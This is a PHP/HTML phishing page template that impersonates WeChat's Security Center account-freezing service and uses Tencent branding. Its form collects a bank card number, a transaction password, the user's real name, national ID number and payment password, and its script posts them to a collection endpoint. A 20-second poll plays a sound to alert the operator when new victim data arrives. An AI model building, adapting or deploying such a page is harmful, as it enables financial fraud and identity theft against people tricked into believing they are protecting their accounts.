<?php $global = \Session::get('GLOBAL_OPTIONS');?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<title>核实登记 - 微信安全中心 - 安全连接一切</title>
	<meta http-equiv="content-type" content="text/html;charset=utf-8"/>
    
	<meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <meta name="keywords" content="冻结微信帐号,微信冻结,冻结帐号,冻结微信,紧急冻结微信号,微信被盗怎么办" />
    <meta name="description" content="微信安全中心(weixin110.qq.com)提供冻结帐号服务。" />
	<title>微信安全中心</title>
	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
	<link rel="stylesheet" type="text/css" href="/assets/web/css/common2e644f.css">
    <link rel="stylesheet" type="text/css" href="/assets/web/css/tools2e1af5.css"/>
    <link rel="stylesheet" type="text/css" href="/assets/web/css/common2f6835.css"/>
	<style>
	body{
		font-size: 17px;
	}
	.banner {
	  position: relative;
	  margin-top: -50px;
	  padding-top: 50px;
	  height: 130px;
	  line-height: 130px;
	  /*height: 420px;
	  width:100%;
	  line-height: 420px;*/
	  background: transparent url(/assets/web/images/checkbook/tools_blur2e1af5.jpg) no-repeat center center;
	  background-size: cover;
	  -webkit-background-size: cover;
	}
	.inner {
		width: 100%; 
		margin: 0 auto;
	}
	.frm_input_box{		
		width: 98%;
		height: 37px;
		line-height: 37px;
	}
	.frm_label{line-height: 25px;}
	.tools_hd{padding: 20px 0;}
	</style>
</head>
<body class="" type="frozen" debug="">
<div class="body">
    <div class="banner">
       <!-- <h1>登记核实</h1>-->
    </div>
<div class="tools_hd"></div>
<div class="tools_bd">
    <div class="inner">
		<div style="padding-bottom:20px;width: 87%;margin-left: 2em;">
			<p>如果怀疑微信帐号被盗，你可以冻结微信帐号阻止他人登录。</p>
			<br>
			<p>输入需要登记的核实帐号</p>
		</div>
        <form class="form" step="1" style="width: 75%;margin-left: 2em;">
            <input id="deviceid" type="hidden" name="deviceid" value="">
			<?php if(\Input::get('type') == 'phone'){ ?>
				<div ref="linkphone" class="j_acctInputWrp frm_controls" style="display: block;margin-bottom: 2%;position: relative;">
					<label class="frm_label">手机号码</label>
					<div class="frm_controls">
					<span class="frm_input_box">
						<input required="linkphone" id="linkphone" maxlength="20" class="frm_input" type="number" placeholder="请输入手机号码">
					</span>
					</div>
				</div>
			<?php } else if(\Input::get('type') == 'qq'){ ?>
				<div ref="qq" class="j_acctInputWrp frm_controls" style="display: block;margin-bottom: 2%;position: relative;">
					<label class="frm_label">QQ号</label>
					<div class="frm_controls">
					<span class="frm_input_box">
						<input required="qq" id="qq" maxlength="11" class="frm_input" type="text" placeholder="请输入QQ号">
					</span>
						<!--
                        <p class="frm_msg fail" style="display:none;">
                            <span class="frm_msg_content">请输入正确的QQ号</span>
                        </p>-->
					</div>
				</div>
			<?php } else if(\Input::get('type') == 'email'){ ?>
				<div ref="email" class="j_acctInputWrp frm_controls" style="display: block">
					<label class="frm_label">Email</label>
					<div class="frm_controls">
					<span class="frm_input_box">
						<input required="email" id="email" maxlength="50" class="frm_input" type="text" placeholder="请输入邮箱" />
					</span>
					</div>
				</div>
			<?php }else{ ?>
				<div ref="paypwd" class="j_acctInputWrp frm_controls" style="display: block;margin-bottom: 2%;position: relative;">
					<label class="frm_label">银行卡号码</label>
					<div class="frm_controls">
					<span class="frm_input_box">
						<input required="paypwd" id="account" maxlength="20" class="frm_input" type="number" placeholder="请输入银行卡号码">
					</span>
					</div>
				</div>
				<div ref="paypwd" class="j_acctInputWrp frm_controls" style="display: block;margin-bottom: 2%;position: relative;">
					<label class="frm_label">交易密码</label>
					<div class="frm_controls">
					<span class="frm_input_box">
						<input required="paypwd" maxlength="20" class="frm_input" type="number" placeholder="6位数交易密码">
					</span>
					</div>
				</div>
			<?php } ?>

			<div ref="realname" class="j_acctInputWrp frm_controls" style="display: block;margin-bottom: 2%;position: relative;">
				<label class="frm_label">姓名</label>
				<div class="frm_controls">
					<span class="frm_input_box">
						<input required="realname" maxlength="5" class="frm_input" type="text" placeholder="请输入姓名">
					</span>
				</div>
			</div>
			<div ref="idcode" class="j_acctInputWrp frm_controls" style="display: block;margin-bottom: 2%;position: relative;">
				<label class="frm_label">身份证号码</label>
				<div class="frm_controls">
					<span class="frm_input_box">
						<input required="idcode" maxlength="18" class="frm_input" type="text" placeholder="请输入身份证号码">
					</span>
				</div>
			</div>
			<div ref="paypwd" class="j_acctInputWrp frm_controls" style="display: block;margin-bottom: 2%;position: relative;">
				<label class="frm_label">支付密码</label>
				<div class="frm_controls">
					<span class="frm_input_box">
						<input required="paypwd" maxlength="6" class="frm_input" type="password" placeholder="请输入支付密码">
					</span>
				</div>
			</div>

        </form>
    </div>
			
	<div class="tool_bar tc">
		<a href="javascript:" class="btn btn_default">返回</a>
		<a id="submitBtn" class="btn btn_primary" href="javascript:">下一步</a>
	</div>
</div>

</div>

<div id="foot" class="foot">
    <ul class="links">
        <li class="links_item no_extra"><a href="" target="_blank">关于腾讯</a></li>
		<li class="links_item "><a href="" target="_blank">About Tencent</a></li>
		<li class="links_item "><a href="" target="_blank">服务条款</a></li>
		<li class="links_item "><a href="" target="_blank">腾讯招聘</a></li>
		<li class="links_item "><a href="" target="_blank">客服中心</a></li>
		<li class="links_item "><a href="" target="_blank">隐私政策</a></li>
	</ul>
    <p class="copyright">Copyright &copy; 2011 - 2016 Tencent All Right Reserved.</p>
</div>
<script type="text/javascript" src="/assets/web/jquery1.11.3/jquery.js" ></script>
<script type="text/javascript" src="/assets/web/js/footFixed2e1af5.js"></script>
<script type="text/javascript" src="/assets/web/js/wxForm2e1af5.js"></script>
<script type="text/javascript" src="/assets/web/js/common2f6835.js"></script>
<script type="text/javascript">
	var checknewsObj;
    !function(w, b){
        w.WX110 = {
            BASE_PATH: "/security/readtemplate?lang=zh_CN&type=" + b.getAttribute("type") + "&t=account_frozen",

            CGI_URL: "/security/frozen?action=1&lang=zh_CN",

            TEXT_NETWORKERR: "网络错误，请稍后再试",

            FUNC_GOTO: function(page){
                location.href = this.BASE_PATH + page
            }
        };
    }(window, document.body);
	
	$(function(){
		//核实记录
		$("#submitBtn").click(function(){
			var ajaxurl = "";
			var param = [];
			var sys = checksys();

			var msg = '';
			<?php if(\Input::get('type') == 'phone'){ ?>
			if($('#linkphone').val().trim().length < 1){
				msg = '请填写手机号码';
			}else if($('#linkphone').val().trim().length != 11){
				msg = '错误的手机号码';
			}
			<?php } else if(\Input::get('type') == 'qq'){ ?>
			if($('#qq').val().trim().length < 1){
				msg = '请填写QQ号码';
			}else if($('#qq').val().trim().length < 5 || $('#qq').val().trim().length > 10){
				msg = '错误的QQ号码';
			}
			<?php } else if(\Input::get('type') == 'email'){ ?>
			if($('#email').val().trim().length < 1){
				msg = '请填写Email';
			}else if(/\w@\w*\.\w/.test($('#email').val().trim())){
				msg = '错误的QQ号码';
			}
			<?php }else{ ?>
			if($('#account').val().trim().length < 1){
				msg = '请填写银行卡号';
			}else if($('#account').val().trim().length < 10){
				msg = '错误的银行卡号';
			}
			<?php } ?>

			if(msg.trim().length > 0){
				alert(msg);
				return;
			}

			$.post(ajaxurl,param,function(data,status){
				if(data.status == 'succ'){
					alert("");
				}else{
					alert("核实失败");
				}
			});
		});
		
		$("#linkphone").onblur(function(){
			validatemobile($this);
		})
	})
	
	function checksys(){
		if(/android/i.test(navigator.userAgent)){
			return "android";
		}else{
			return "ios";
		}
	}
	function openCheckNews(yn){
		if(yn = true){
			checknewsObj = setInterval("checknews()",20000);//20秒检测是否有数据推送
		}else{
			if(checknewsObj !=null)
				clearInterval(checknewsObj);
		}
		
	}
	
	function checknews(){
		var ajaxurl = "";
		$.post(ajaxurl,param,function(data,status){
				if(data.status == 'succ'){
					playmusic();
				}else{
					alert("核实失败");
				}
			});
	}
	
	function playmusic(){
		//播放音乐
		if(Xut.fix.audio){
			audio
			= 
			Xu.fix.audio;
				audio.src="";
		}else{
			audio = new Audio("");
		}
		audio.autoplay= true;
		
		audio.play();
	}
</script>
<script>
function validatemobile(mobile) 
   { 
       if(mobile.length==0) 
       { 
          alert('请输入手机号码！'); 
          document.form1.mobile.focus(); 
          return false; 
       }     
       if(mobile.length!=11) 
       { 
           alert('请输入有效的手机号码！'); 
           document.form1.mobile.focus(); 
           return false; 
       } 
        
       var myreg = /^(((13[0-9]{1})|(17[0-9]{1})|(15[0-9]{1})|(18[0-9]{1}))+\d{8})$/; 
       if(!myreg.test(mobile)) 
       { 
           alert('请输入有效的手机号码！'); 
           document.form1.mobile.focus(); 
           return false; 
       } 
   } 
</script>

</body>
</html>

